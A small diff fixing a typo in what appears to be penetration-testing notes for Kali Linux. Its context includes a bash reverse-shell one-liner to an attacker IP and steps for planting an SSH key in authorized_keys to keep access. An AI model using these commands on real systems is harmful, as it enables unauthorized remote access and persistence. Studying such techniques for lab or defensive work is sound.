@@ -358,7 +358,7 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * Accept the default for the rest of the settings
 * Create the authorized_keys file in the .ssh folder if it does not exist
 * cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
-* On you kali Linux generate ssh keys and transfer the public key to the server with the scp command.
+* On your Kali Linux generate ssh keys and transfer the public key to the server with the scp command.
 * Add the key to the authorized_keys so that you can authenticate with ssh keys
 * Go to the ssh configuration file
 * Allow public key authentication
